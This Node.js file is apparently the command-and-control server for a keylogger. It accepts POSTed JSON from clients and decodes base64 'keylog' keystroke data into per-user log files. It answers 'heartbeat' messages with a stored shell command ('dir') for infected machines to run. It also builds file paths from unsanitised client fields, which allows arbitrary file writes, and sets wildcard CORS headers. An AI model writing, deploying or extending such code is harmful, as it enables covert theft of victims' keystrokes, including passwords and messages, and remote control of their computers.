const http = require('http')
const fs = require('fs')
const port = 3000
const host = '127.0.0.1'

dbg_flag = false

function print_dbgmsg(msg) {
    if (dbg_flag) console.log(msg)
}


const server = http.createServer(function(request, response) {
    response.setHeader('Access-Control-Allow-Origin', '*');
    response.setHeader('Access-Control-Allow-Methods', '*');
    response.setHeader('Access-Control-Allow-Headers', '*');

    if (request.method == 'POST') {
        console.log("Post Request Detected")
        var postMessage = ''
        request.on('data', function(data) {
            postMessage += data
        })

        request.on('end', function() {

            parse_message(postMessage)
            send_response(postMessage, response)

        })

    } else {
        response.writeHead(200, {
            'Content-Type': 'text/html'
        })
        fs.readFile('index.html', function(error, data) {
            if (error) {
                response.writeHead(404)
                response.write('Error: File Not Found')
            } else {
                response.write(data)
            }
            response.end()
        })
    }
})


function parse_message(postMessage) {
    var msg = JSON.parse(postMessage)
    var user_id = msg.user_id
    var msg_time = msg.time
    var msg_type = msg.type
    var msg_data = msg.data
    
    var log_dir = create_log_directory(user_id, msg_type)
    convert_post_request(log_dir, msg_time, msg_type, msg_data)
    
}

function create_log_directory(user_id, msg_type) {
    log_dir = "./logs/" + user_id + "/" + msg_type + "/"
    if (!fs.existsSync(log_dir)) {
        fs.mkdirSync(log_dir, { recursive: true })
    }

    return log_dir
}


var stored_cmd = "dir";
function send_response(postMessage, response) {
        console.log("Sending Response")
        msg = JSON.parse(postMessage)
        if (msg.type === 'heartbeat') {
          response.end(JSON.stringify(stored_cmd));
        } else {
          response.end(JSON.stringify("Response Message"));
          console.log("Response Sent")
        }
}


function convert_post_request(log_dir, time, type, data) {
    
    switch(type) {
        case "heartbeat":
            print_dbgmsg("Heartbeat Detected")
            break;
        case "keylog":
            print_dbgmsg("Keylog Data Detected")
            keylog_data_handler(log_dir, time, data)
            break;
        default:
            print_dbgmsg("Some Other Data Detected")
    }
}


function write_to_log_file(filename, message) {
fs.writeFile(filename, `${message}\n`, (err) => {
    if (err) {
        console.error(`There was an error writing to the log file: ${err}`);
    }
    });
}


function base64Decode(base64EncodedData) {
    return Buffer.from(base64EncodedData, 'base64').toString('utf8');
}
  


function keylog_data_handler(log_dir, time, data) {
    keylog_logfile = log_dir + time + ".log"
    const base64DecodedData = base64Decode(data)
    write_to_log_file(keylog_logfile, base64DecodedData)
}
server.listen(port, host)
console.log("listening on ", host + ":" + port)